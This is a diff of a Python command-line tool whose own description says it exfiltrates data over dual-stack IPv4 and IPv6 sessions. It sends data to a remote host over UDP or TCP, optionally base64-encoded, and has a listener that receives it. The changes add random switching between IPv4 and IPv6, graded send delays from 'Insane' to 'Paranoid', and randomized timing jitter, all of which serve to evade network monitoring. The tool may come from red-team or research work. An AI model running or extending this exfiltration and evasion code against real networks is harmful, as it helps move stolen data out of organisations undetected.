@@ -1,12 +1,14 @@
 #!/usr/bin/python3 -tt
 # (C) 2015 Bernhards 'Lockout' Blumbergs
-__version__ = "0.5/Audrey"
+
+__version__ = "0.6/Bridgette"
 
 import socket
 import sys
 import argparse
 import base64
-from random import randint
+import random
+from os import urandom
 from time import sleep
 from math import ceil
 
@@ -16,11 +18,7 @@ def send64(data, mode):
     Send the specified data to the destination socket
     over IPv6 and IPv4 interchangeably
     """
-    r = randint(1, 100)             # Choose between IPv4 and IPv6
-    if r % 2 == 0:                  # TODO: Update the selection
-        version = 6                 # algorithm needed
-    else:
-        version = 4
+    version = ip_version(args.ip_version_select)
 
     if version == 4:
         host = args.host4
@@ -29,7 +27,7 @@ def send64(data, mode):
 
     if not args.udp and not args.tcp:
         if args.verbose >= 2:
-            print("[*] Defaulting to UDP protocol")
+            print("[+] Defaulting to UDP protocol")
         args.udp = True
 
     if args.udp:
@@ -51,9 +49,9 @@ def send64(data, mode):
 
         if args.verbose >= 1:
             print(
-                "[*] UDP socket to"
-                " {0}:{1} via {2}".format(
-                    host, port, args.interface)
+                "[*] IPv{0} UDP socket to"
+                " {1}:{2} via {3}".format(
+                    version, host, port, args.interface)
                 )
 
         if args.base64:
@@ -67,7 +65,7 @@ def send64(data, mode):
         sock.sendto(data, (host, port))     # Send UDP datagram
         if args.verbose >= 2:
             print(
-                "[*] Buffer {0} bytes sent:\n{1}".format(
+                "[+] Buffer {0} bytes sent:\n{1}".format(
                     len(data), data)
                 )
 
@@ -93,9 +91,9 @@ def send64(data, mode):
 
         if args.verbose >= 1:
             print(
-                "[*] Connecting to TCP"
-                " socket {0}:{1} via {2}".format(
-                    host, port, args.interface)
+                "[*] IPv{0} Connecting to TCP"
+                " socket {1}:{2} via {3}".format(
+                    version, host, port, args.interface)
                 )
 
         sock.connect((host, port))
@@ -113,7 +111,7 @@ def send64(data, mode):
         sock.send(data)                     # Send TCP stream
         if args.verbose >= 2:
             print(
-                "[*] Buffer {0} bytes sent:\n{1}".format(
+                "[+] Buffer {0} bytes sent:\n{1}".format(
                     len(data), data)
                 )
 
@@ -121,35 +119,74 @@ def send64(data, mode):
         return(True)                        # Send success
 
 
+def ip_version(sel_type):                   # TODO: Successive session
+                                            # tracking needs to be implemented
+    """                                     
+    IP version selection algorithms
+    """
+    random.seed(a=urandom(100))             # Initialize seed urandom
+    if sel_type == 0:                       # Random odd selection
+        r = random.randint(1, 100)
+        if r % 2 == 0:
+            version = 6
+        else:
+            version = 4
+    elif sel_type == 1:                     # Random selection
+        version = random.sample([4, 6], 1)[0]
+    elif sel_type == 2:
+        version = random.choice([4, 6])
+    elif sel_type == 4:                     # IPv4 only
+        version = 4
+    elif sel_type == 6:                     # IPv6 only
+        version = 6
+    return(version)
+
+
 def wait():
     """
     Session timing (seconds)
     """
-    if args.timing == 0:
+    if args.timing_set == -1:
+        if args.timing == 0:
+            sleep_time = 0.15               # Insane
+            if args.verbose >= 2:
+                print("[+] Insane send")
+        elif args.timing == 1:
+            sleep_time = 3                  # Agressive
+            if args.verbose >= 2:
+                print("[+] Agressive send")
+        elif args.timing == 2:
+            sleep_time = 15                 # Polite
+            if args.verbose >= 2:
+                print("[+] Polite send")
+        elif args.timing == 3:
+            sleep_time = 30                 # Sneaky
+            if args.verbose >= 2:
+                print("[+] Sneaky send")
+        elif args.timing >= 4:
+            sleep_time = 300                # Paranoid
+            if args.verbose >= 2:
+                print("[+] Paranoid send")
+    if args.timing_set >= 0:                # Custom timing
+        sleep_time = args.timing_set
         if args.verbose >= 2:
-            print("[*] Insane send")
-        sleep(0.15)                          # Insane
-    if args.timing == 1:
+            print(
+                "[+] Custom interval timing of {0}s".format(
+                    sleep_time)
+                )
+    if args.timing_randomize:
+        sleep_time = sleep_time + random.uniform(-0.4, 0.4) * sleep_time
         if args.verbose >= 2:
-            print("[*] Agressive send")
-        sleep(3)                            # Agressive
-    elif args.timing == 2:
-        if args.verbose >= 2:
-            print("[*] Polite send")
-        sleep(15)                           # Polite
-    elif args.timing == 3:
-        if args.verbose >= 2:
-            print("[*] Sneaky send")
-        sleep(30)                           # Sneaky
-    elif args.timing >= 4:
-        if args.verbose >= 2:
-            print("[*] Paranoid send")
-        sleep(300)                          # Paranoid
+            print(
+                "[+] Session interval randomized to {0}s".format(
+                    sleep_time)
+                )
+    sleep(sleep_time)
     return(True)
 
 # Command line option parser
 parser = argparse.ArgumentParser(
-    description="Exfiltrate data over IPv4 and IPv6 sessions",
+    description="Exfiltrate data over dual-stack IPv4 and IPv6 sessions",
     )
 
 parser.add_argument(
@@ -203,6 +240,12 @@ parser.add_argument(
     help="Source port. Default: 443")
 
 parser.add_argument(
+    '--ip_version_select',
+    type=int,
+    default=0,
+    help="Choose random IP version selection approach")
+
+parser.add_argument(
     '-i', '--interface',
     type=str,
     default="eth0",
@@ -216,14 +259,25 @@ parser.add_argument(
 
 parser.add_argument(
     '-T', '--timing',
-    action="count",
-    default=0,
-    help="Session delay timing 0-4. Default: 0")
+    type=int,
+    default=1,
+    help="Session delay timing level 0-4. Default: 1")
+
+parser.add_argument(
+    '-TR', '--timing_randomize',
+    action="store_true",
+    help="Randomize session delay timing. Default: False")
+
+parser.add_argument(
+    '--timing_set',
+    type=int,
+    default=-1,
+    help="Set custom timing. Default: Disabled")
 
 parser.add_argument(
     '-V', '--version',
     action="store_true",
-    help="Print version")
+    help="Print program version and exit")
 
 args = parser.parse_args()
 
@@ -260,7 +314,7 @@ if not args.listen:
             data = b""
 
     send64(b"", 0)                              # End of transmission
-
+                                                # Can be profiled?
 # Listen mode
 if args.listen:
     if args.verbose >= 1:
@@ -271,7 +325,7 @@ if args.listen:
 
     if not args.udp and not args.tcp:
         if args.verbose >= 2:
-            print("[*] Defaulting to UDP protocol")
+            print("[+] Defaulting to UDP protocol")
         args.udp = True
 
     if args.udp:
@@ -288,7 +342,7 @@ if args.listen:
 
         sock64.bind(('::', port))               # Listen on both protocols
 
-        if args.verbose >= 2:
+        if args.verbose >= 1:
             print(
                 "[*] Listening on {0} IPv4:'{1}'"
                 " IPv6:'{2}' port:{3} protocol:UDP".format(
@@ -300,7 +354,7 @@ if args.listen:
 
             if data64:
                 if args.verbose >= 2:
-                    print("[*] Received from {0}".format(addr64))
+                    print("[+] Received from {0}".format(addr64))
                 if args.base64:
                     if args.verbose >= 3:
                         print(
@@ -330,7 +384,7 @@ if args.listen:
         sock64.bind(('::', port))               # Listen on both protocols
         sock64.listen(1)
 
-        if args.verbose >= 2:
+        if args.verbose >= 1:
             print(
                 "[*] Listening on {0} IPv4:'{1}'"
                 " IPv6:'{2}' port:{3} protocol:TCP".format(
@@ -343,7 +397,7 @@ if args.listen:
 
             if data64:
                 if args.verbose >= 2:
-                    print("[*] Received from {0}".format(addr64))
+                    print("[+] Received from {0}".format(addr64))
                 if args.base64:
                     if args.verbose >= 3:
                         print(
